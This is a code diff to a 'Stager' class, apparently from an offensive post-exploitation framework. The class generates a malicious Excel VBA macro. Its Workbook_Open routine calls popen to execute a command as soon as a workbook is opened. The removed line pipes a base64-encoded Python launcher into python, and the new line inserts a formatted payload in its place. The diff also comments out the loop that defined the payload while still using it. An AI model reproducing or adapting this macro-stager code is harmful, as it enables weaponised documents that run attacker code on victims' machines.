@@ -81,8 +81,8 @@ class Stager:
 
         else:
             launcher = launcher.replace("\"", "\"\"")
-            for match in re.findall(r"'(.*?)'", launcher, re.DOTALL):
-                payload = formStr("cmd", match)
+            # for match in re.findall(r"'(.*?)'", launcher, re.DOTALL):
+            #     payload = formStr("cmd", match)
 
             macro = """
 Option Explicit
@@ -101,7 +101,7 @@ Private Sub Workbook_Open()
     #Else
     Dim result As Long
     #End If
-    result = popen("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &", "r")
+    result = popen("%s", "r")
 End Sub
 """ %(payload)
 
